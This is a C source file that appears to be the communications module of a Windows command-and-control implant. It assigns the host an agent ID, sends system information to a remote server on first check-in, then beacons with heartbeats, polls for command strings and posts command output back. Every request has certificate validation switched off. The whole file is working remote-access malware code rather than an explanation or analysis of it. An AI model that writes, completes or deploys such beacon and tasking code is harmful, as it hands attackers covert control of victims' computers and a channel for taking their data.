#include <windows.h>
#include <stdio.h>
#include <winhttp.h>

#include "utils.h"
#include "comms.h"

#pragma comment(lib, "winhttp.lib")

char agent_id[64];
int first_checkin = 1;

wchar_t heartbeat_path[128];
wchar_t checkin_path[128];

void InitializeComms() {
    GenerateUUID(agent_id, sizeof(agent_id));
    
    swprintf(heartbeat_path, 128, L"/heartbeat/%S", agent_id);
    swprintf(checkin_path, 128, L"/checkin/%S", agent_id);
}

// POST to /heartbeat/<agent_id>
void SendHeartbeat(void) {
    char payload[512] = {0};
    DWORD payloadSize = 0;

    if (first_checkin) {
        GetSystemInfoForServer(payload, sizeof(payload));
        payloadSize = (DWORD)strlen(payload);
        first_checkin = 0;
    } else {
        strcpy(payload, "ping");
        payloadSize = (DWORD)strlen(payload);
    }

    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", heartbeat_path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    const wchar_t *headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers, -1, payload, payloadSize, payloadSize, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// POST to /output/<agent_id>
void SendOutput(const char *output) {
    wchar_t output_path[128];
    swprintf(output_path, 128, L"/output/%S", agent_id);

    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", output_path, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                       (LPVOID)output, (DWORD)strlen(output), (DWORD)strlen(output), 0);
    WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

// GET from /checkin/<agent_id> → returns command string
int GetCommand(char *command, DWORD maxLen) {
    HINTERNET hSession = WinHttpOpen(USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return 0;

    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_HOST, SERVER_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", checkin_path, NULL,
                                            WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));

    BOOL result = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                     WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                  WinHttpReceiveResponse(hRequest, NULL);

    if (result) {
        DWORD size = 0;
        WinHttpQueryDataAvailable(hRequest, &size);
        if (size > 0 && size < maxLen) {
            WinHttpReadData(hRequest, command, size, NULL);
            command[size] = '\0';
            WinHttpCloseHandle(hRequest);
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return 1;
        }
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 0;
}
